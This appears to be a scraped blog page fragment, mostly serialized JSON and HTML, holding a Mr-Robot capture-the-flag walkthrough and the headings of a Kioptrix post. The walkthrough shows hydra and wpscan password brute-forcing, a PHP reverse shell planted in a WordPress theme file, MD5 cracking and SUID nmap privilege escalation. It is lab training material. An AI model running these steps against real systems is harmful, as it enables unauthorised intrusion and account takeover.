IP address (1 host up) scanned in 356.82 seconds`&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1--samba&quot;],&quot;text&quot;:[0,&quot;Method-1  Samba&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-2-openfuck-mod_ssl-vulnerability&quot;],&quot;text&quot;:[0,&quot;Method-2 OpenFuck mod_ssl vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 1&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/10&quot;]}],&quot;nextPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/mr-robot&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mr-Robot&quot;],&quot;date&quot;:[3,&quot;2023-02-09T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -sV -O -Pn -T4 192.168.124.80 -p-\nnmap --script vuln 192.168.124.80 -p-\ndirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt\n```\nFound login page\n![](img/1675935901724.PNG)\nThe wordlist of fsocity.dic\n![](img/1675935906897.PNG)\n\nThe first key\n\n![](img/1675935911648.PNG)\n***\n# Method-1\n## Exploit wordpress\nsort and uniq\n```\nsort fsocity.dic | uniq &gt; fsocity-sort.dic\n```\nHydra enumerate users\n```\nhydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post \&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:Invalid username\&quot;\n```\n![](img/1675935995098.PNG)\n\nWpscan intrude users and password\n```\nwpscan --url http://192.168.124.4/  --usernames Elliot --passwords fsocity-sort.dic\n```\n![](img/1675936001210.PNG)\n\n[Valid Combinations Found:\n Username: Elliot, Password: ER28-0652\nLogin in wordpress\n***\n## Getshell\nVisit Appearance-Editor,write shell code into 404.php\nThere are plenty of webshell in /usr/share/webbshells/php/\nUse php-reverse-shell.php\nRemember to change its ip and port\n![](img/1675936011245.png)\n\n\nlisten port 1234 on kali.\nThen  visit any pay which  not exists.\n`nc -lvnp 1234`\n![](img/1675936061435.PNG)\n\n\nFound another user robot and its file\n![](img/1675936067906.PNG)\n\nDecode password\nWrite &#39;c3fcd3d76192e4007dfb496cca67e13b&#39; into hash.txt\n```\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5\n```\n![](img/1675936335560.PNG)\nTurn to user robot\n```\npython -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; \nsu robot\n```\n![](img/1675936356620.PNG)\n\n\n***\n## Privilege escalation\nTry to escalate privilege through suid\nFind all the suid file.\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null\n```\n![](img/1675936394011.png)\nNmap privilege escalation\nOnly can be used when nmap is version 2.02-5.21\n```\n/usr/local/bin/nmap --interactive\n!sh\nwhoami\n```\n![](img/1675936402754.PNG)\n`cat /root/key-3-of-3.txt`\n\n\n***\n# Enclosure\n\n![](img/1675935870791.PNG)\n\n![](img/1675935877529.png)\n\n![](img/1675935887078.PNG)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Mr-Robot.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]],&quot;digest&quot;:[0,&quot;f948ce3104c70e88&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sV -O -Pn -T4 192.168.124.80 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.80 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Found login page\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935901724.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nThe wordlist of fsocity.dic\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935906897.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;The first key&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935911648.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;exploit-wordpress\&quot;&gt;Exploit wordpress&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploit-wordpress\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;sort and uniq&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sort fsocity.dic | uniq &gt; fsocity-sort.dic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Hydra enumerate users&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post \&quot;/wp-login.php:log=^USER^&amp;#x26;pwd=^PASS^&amp;#x26;wp-submit=Log In:Invalid username\&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935995098.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Wpscan intrude users and password&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wpscan --url http://192.168.124.4/  --usernames Elliot --passwords fsocity-sort.dic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936001210.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;[Valid Combinations Found:\nUsername: Elliot, Password: ER28-0652\nLogin in wordpress&lt;/p&gt;\n&lt;hr&gt;\n&lt;h2 id=\&quot;getshell\&quot;&gt;Getshell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#getshell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Visit Appearance-Editor,write shell code into 404.php\nThere are plenty of webshell in /usr/share/webbshells/php/\nUse php-reverse-shell.php\nRemember to change its ip and port\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936011245.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;listen port 1234 on kali.\nThen  visit any pay which  not exists.\n&lt;code&gt;nc -lvnp 1234&lt;/code&gt;\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936061435.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Found another user robot and its file\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936067906.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Decode password\nWrite ‘c3fcd3d76192e4007dfb496cca67e13b’ into hash.txt&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936335560.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nTurn to user robot&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;su robot&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936356620.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h2 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Try to escalate privilege through suid\nFind all the suid file.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936394011.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nNmap privilege escalation\nOnly can be used when nmap is version 2.02-5.21&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936402754.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;code&gt;cat /root/key-3-of-3.txt&lt;/code&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935870791.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935877529.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935887078.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;exploit-wordpress&quot;],&quot;text&quot;:[0,&quot;Exploit wordpress&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;getshell&quot;],&quot;text&quot;:[0,&quot;Getshell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mr-Robot&quot;],&quot;date&quot;:[3,&quot;2023-02-09T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/9&quot;]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;HomeSiderPanel&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/img/avatar.webp" fetchPriority="high"/><div class="cursor-pointer rounded-sm bg-black/8 p-1 font-semibold backdrop-blur-lg select-none my-4 flex w-full justify-between text-sm/6"><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2ZM12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM15.8329 7.33748C16.0697 7.17128 16.3916 7.19926 16.5962 7.40381C16.8002 7.60784 16.8267 7.92955 16.6587 8.16418C14.479 11.2095 13.2796 12.8417 13.0607 13.0607C12.4749 13.6464 11.5251 13.6464 10.9393 13.0607C10.3536 12.4749 10.3536 11.5251 10.9393 10.9393C11.3126 10.5661 12.9438 9.36549 15.8329 7.33748ZM17.5 11C18.0523 11 18.5 11.4477 18.5 12C18.5 12.5523 18.0523 13 17.5 13C16.9477 13 16.5 12.5523 16.5 12C16.5 11.4477 16.9477 11 17.5 11ZM6.5 11C7.05228 11 7.5 11.4477 7.5 12C7.5 12.5523 7.05228 13 6.5 13C5.94772 13 5.5 12.5523 5.5 12C5.5 11.4477 5.94772 11 6.5 11ZM8.81802 7.40381C9.20854 7.79433 9.20854 8.4275 8.81802 8.81802C8.4275 9.20854 7.79433 9.20854 7.40381 8.81802C7.01328 8.4275 7.01328 7.79433 7.40381 7.40381C7.79433 7.01328 8.4275 7.01328 8.81802 7.40381ZM12 5.5C12.5523 5.5 13 5.94772 13 6.5C13 7.05228 12.5523 7.5 12 7.5C11.4477 7.5 11 7.05228 11 6.5C11 5.94772 11.4477 5.5 12 5.5Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs text-primary-foreground grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M5.75024 3.5H4.71733L3.25 3.89317V5.44582L4.25002 5.17782L4.25018 8.5H3V10H7V8.5H5.75024V3.5ZM10 4H21V6H10V4ZM10 11H21V13H10V11ZM10 18H21V20H10V18ZM2.875 15.625C2.875 14.4514 3.82639 13.5 5 13.5C6.17361 13.5 7.125 14.4514 7.125 15.625C7.125 16.1106 6.96183 16.5587 6.68747 16.9167L6.68271 